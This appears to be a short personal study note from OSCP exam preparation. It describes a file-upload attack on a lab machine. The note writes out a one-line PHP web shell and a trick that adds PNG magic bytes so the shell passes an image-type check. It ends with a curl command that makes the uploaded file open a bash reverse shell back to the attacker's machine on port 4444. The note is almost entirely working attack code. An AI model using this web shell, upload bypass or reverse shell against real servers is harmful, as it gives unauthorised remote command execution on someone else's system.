```
vim shell.php.png
```

```
<?php
system($_REQUEST['cmd']);
?>
```

```
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
cat shell.php.png >> mime_shell.php.png
```

---

Upload. Access the image.

---

Curl a reverse shell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/${KaliIP}/4444 0>&1"' http://10.10.10.146/uploads/10_10_14_2.php.png`;

dv.paragraph("```bash\n" + command + "\n```");
```
